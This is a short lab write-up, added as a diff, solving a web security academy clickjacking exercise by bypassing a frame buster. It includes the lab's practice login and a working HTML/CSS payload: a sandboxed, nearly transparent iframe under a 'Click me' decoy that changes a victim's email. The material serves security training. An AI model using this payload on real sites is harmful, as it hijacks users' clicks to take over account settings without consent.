@@ -1,0 +1,36 @@
+Lab #2: Clickjacking with a frame buster script
+
+Target: Change an email address
+
+This lab is protected by a frame buster which prevents the website from being framed. 
+Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?
+
+
+Hint: 
+    To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. 
+    The lab is solved when the email address is changed.
+    You can log in to your own account using the following credentials: wiener:peter
+
+
+
+Analysis:
+
+    Without sandbox parameter the iframe is not rendered in the web browser.
+Solution:
+  <style>
+    iframe {
+        position: relative; 
+        height: 1000px; 
+        width: 700px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:450px;
+        left:80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://myPOrtSwiggerID.web-security-academy.net/my-account?email=aaaa@vvvv.com" sandbox="allow-forms"></iframe>
